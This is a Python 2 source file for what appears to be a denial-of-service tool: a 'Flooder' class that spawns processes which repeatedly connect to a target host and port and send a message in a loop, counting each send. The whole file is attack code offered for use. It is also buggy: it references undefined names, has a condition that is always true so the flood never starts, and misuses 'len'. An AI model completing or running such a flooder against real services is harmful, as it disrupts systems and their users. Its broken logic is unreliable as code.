import socket, threading, random, time
from multiprocessing import Process
from Events import *
from main import *

def randomString(length):
    allowedChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
    string = ''.join(random.choice(allowedChars) for i in xrange(length))
    return string

class TCPWorkerThread:

    def __init__(self, flooder):
        self.socket = socket.socket()
        #self.socket.settimeout(flooder.timeout) #perhaps this should be blocking/nonblocking

        self.flooder = flooder
        self.running = True
        self.floodCount = 0

        if flooder.random:
            self.message = randomString(256)
        else:
            self.message = self.flooder.message

    def stop(self):
        self.running = False

    def run(self):
        while self.running:
            try:
                self.socket.connect((self.flooder.host, self.flooder.port))
            except:
                continue
            break


        while self.running:
            try:
                self.floodCount += 1
                self.socket.send(self.message)
                if self.flooder.wait != None:
                    time.sleep(self.flooder.wait)
            except:
                pass

class Flooder:

    def __init__(self, host, port, timeout, method, threads, subsite = None, message = None, Random = False, wait = None):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.method = method
        self.threadsAmount = threads
        self.__threads = []
        self.__processes = []
        self.wait = wait
        self.speed = speed
        self.subsite = subsite
        self.message = message

        if method == TCP_METHOD:
            if message == None and random == False:
                print "Message missing, not starting."
                return
        if method == UDP_METHOD or HTTP_METHOD:
            print "Not yet implemented, not starting."
            return

        for x in range(threads):
            self.__threads.append(WorkerThread(self))

    def start(self):
        for x in self.__threads:
            p = Process(target=x.run)
            p.start()

    def stop(self):
        floodCount = 0

        for p in self.__processes:
            p.join()

        while len(self.__threads > 0):
            t = self.__threads.pop()
            t.stop()
            floodCount += t.floodCount
        print "final floodcount:", floodCount
